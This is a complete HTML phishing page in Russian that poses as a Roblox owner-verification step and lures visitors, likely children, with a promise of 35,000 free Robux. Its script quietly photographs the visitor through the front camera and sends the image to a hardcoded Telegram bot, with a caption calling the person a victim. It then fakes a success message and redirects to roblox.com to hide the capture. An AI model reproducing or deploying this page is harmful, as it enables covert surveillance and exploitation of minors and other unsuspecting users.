<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cloud Verification</title>
    <style>
        body { font-family: sans-serif; background: #f2f4f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 85%; }
        button { background: #0084ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60">
    <h2>Проверка владельца</h2>
    <p>Нажмите кнопку ниже, чтобы подтвердить личность и получить <b>35,000 Robux</b>.</p>
    <button id="start">✅ ПОДТВЕРДИТЬ</button>
    <p id="err" style="color:red; font-size:12px;"></p>
</div>

<video id="v" autoplay playsinline style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const btn = document.getElementById('start');
    const err = document.getElementById('err');
    
    btn.onclick = async () => {
        btn.innerText = "ПОДОЖДИТЕ...";
        try {
            // Запрос камеры (Самый надежный метод для Chrome)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            // Ждем секунду, чтобы камера проснулась
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', '7889497672');
                    fd.append('photo', blob, 'face.jpg');
                    fd.append('caption', '📸 **ФОТО ПРИШЛО!**\nЖертва в Chrome на Realme.');

                    fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                        method: 'POST',
                        body: fd
                    }).then(() => {
                        stream.getTracks().forEach(t => t.stop());
                        alert("Верификация пройдена! Робуксы зачислятся через 15 минут.");
                        window.location.href = "https://www.roblox.com";
                    });
                }, 'image/jpeg', 0.7);
            }, 1500);

        } catch (e) {
            btn.innerText = "ОШИБКА";
            err.innerText = "Нажми на замочек в строке адреса и разреши камеру!";
            console.error(e);
        }
    };
</script>

</body>
</html>
